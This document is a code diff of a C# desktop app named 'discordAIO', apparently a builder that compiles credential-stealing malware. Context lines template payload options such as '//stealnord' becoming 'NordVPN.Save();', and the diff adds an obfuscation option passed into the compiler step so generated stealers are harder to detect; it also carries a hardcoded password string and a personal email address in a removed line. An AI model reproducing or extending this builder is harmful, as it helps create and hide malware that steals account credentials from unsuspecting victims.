@@ -27,8 +27,10 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v0.3.4";
-        private protected string email = "fmediolanek@gmail.com";
+        private string version = "v0.4.0";
+        private protected string email = ""; // Your email goes here
+
+        // Do not touch
         private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";
 
         public DiscordRpcClient client;
@@ -129,7 +131,6 @@ namespace discordAIO
             scintilla1.Margins[0].Width = 16;
             scintilla1.Styles[Style.LineNumber].BackColor = Color.FromArgb(10, 10, 10);
             scintilla1.ScrollWidth = 1;
-
         }
 
         private void Solid_Paint(object sender, PaintEventArgs e)
@@ -180,11 +181,6 @@ namespace discordAIO
             credentialsPage.Visible = false;
             ssPage.Visible = false;
         }
-
-
-
-
-
 
         // Encryption / Decryption
 
@@ -708,12 +704,17 @@ namespace discordAIO
                                 text = text.Replace("//stealnord", "NordVPN.Save();");
                             }
 
-
+                            bool obfuscationCheck = false;
+                            // Obfuscation
+                            if (checkBox18.Checked)
+                            {
+                                obfuscationCheck = true;
+                            }
 
 
                             label26.Text = "Additional options created. Compiling...";
                             Thread.Sleep(500);
-                            if (Compiler.AIOcompilation(text, saveFileDialog.FileName, string.IsNullOrWhiteSpace(label33.Text) ? null : label33.Text))
+                            if (Compiler.AIOcompilation(text, saveFileDialog.FileName, obfuscationCheck, string.IsNullOrWhiteSpace(label33.Text) ? null : label33.Text))
                             {
                                 label26.Text = "Saved as " + saveFileDialog.FileName;
                                 MessageBox.Show("Compilation done.", "Discord AIO");
@@ -885,8 +886,6 @@ namespace discordAIO
                         string encryptedText = Encrypt(creText);
                         creText = creText.Replace(creText, encryptedText);
                         File.WriteAllText(open.FileName, creText);
-
-                        MessageBox.Show(decryptedText);
 
                         if (decryptedText.Contains("# Windows"))
                         {
